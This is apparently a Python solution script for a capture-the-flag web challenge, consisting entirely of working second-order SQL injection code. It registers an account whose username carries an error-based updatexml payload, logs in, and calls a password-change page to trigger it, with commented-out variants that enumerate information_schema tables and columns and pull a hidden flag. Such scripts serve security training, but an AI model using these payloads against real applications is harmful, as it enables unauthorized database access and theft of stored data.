import requests

session = requests.session()
url1 = 'http://c9f58e97-6be8-4eb6-accb-4ab9ba2ce30d.node4.buuoj.cn:81/register.php'
#name = 'test"^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=\'flag\'))),1)#'
name = 'test"^updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(\'^f\')))),1)#'
# name = 'test"^updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(\'^f\'))),1)#'
#name = 'test"^updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=\'users\')&&(column_name)regexp(\'^r\'))),1)#'
data1 = {
	'username': name,
	'password': '123',
	'email': '123'
}
io1 = session.post(url1,data1)
print(io1.text)


url2 = 'http://c9f58e97-6be8-4eb6-accb-4ab9ba2ce30d.node4.buuoj.cn:81/login.php'
data2 = {
	'username': name,
	'password': '123'
}
io2 = session.post(url2,data2)
print(io2.text)

url3 = 'http://c9f58e97-6be8-4eb6-accb-4ab9ba2ce30d.node4.buuoj.cn:81/changepwd.php'
data = {
	'newpass': '1234',
	'oldpass': '123'
}
io = session.post(url3,data)
print(io.text)